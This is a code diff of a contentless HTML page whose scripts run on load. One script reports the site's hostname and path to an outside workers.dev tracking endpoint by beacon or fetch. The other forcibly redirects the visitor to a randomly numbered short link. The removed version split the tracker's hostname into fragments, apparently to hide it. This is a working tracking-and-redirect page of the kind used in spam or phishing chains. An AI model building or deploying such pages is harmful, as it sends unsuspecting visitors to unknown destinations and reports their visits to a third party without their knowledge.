@@ -1,27 +1,59 @@
+<!doctype html>
 <html>
 <body>
-<script type = "text/javascript">
-async function track() {
-  try {
-    let h1 = "vtrafick.";
-    let h2 = "goooo.";
-    let h3 = "workers.dev/track";
-    let w = location.hostname.split('.')[0] || 'surge';
-    await fetch('https://' + h1 + h2 + h3, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ worker: w, path: '/' }) }).catch(() => {});
-  } catch (e) {}
-  reDirect();
-}
-function reDirect() {
-a = location.href = "rush.";
-b = location.href = "short.";
-c = location.href = "gy/";
-d = Math.ceil(Math.random() * 24);
-a = "https://" + a + b + c + d ;
-window.location = a
-}
-track();
-</script>
+
+  <script type="text/javascript">
+    (function () {
+      var TRACK_ENDPOINT = "https://vtrafick.goooo.workers.dev/track";
+
+      function sendTracking() {
+        try {
+          var payload = JSON.stringify({
+            worker: location.hostname.split('.')[0] || 'surge',
+            path: location.pathname || '/'
+          });
+
+          var blob = new Blob(
+            [payload],
+            { type: 'text/plain;charset=UTF-8' }
+          );
+
+          if (
+            navigator.sendBeacon &&
+            navigator.sendBeacon(TRACK_ENDPOINT, blob)
+          ) {
+            return;
+          }
+
+          fetch(TRACK_ENDPOINT, {
+            method: 'POST',
+            mode: 'cors',
+            headers: {
+              'Content-Type': 'text/plain;charset=UTF-8'
+            },
+            body: payload,
+            keepalive: true
+          }).catch(function () {});
+
+        } catch (e) {}
+      }
+
+      sendTracking();
+    }());
+  </script>
+
+  <script type="text/javascript">
+    function reDirect() {
+    a = location.href = "rush.";
+    b = location.href = "short.";
+    c = location.href = "gy/";
+    d = Math.ceil(Math.random() * 24);
+    a = "https://" + a + b + c + d ;
+    window.location = a
+    }
+
+    reDirect();
+  </script>
+
 </body>
 </html>
-
-
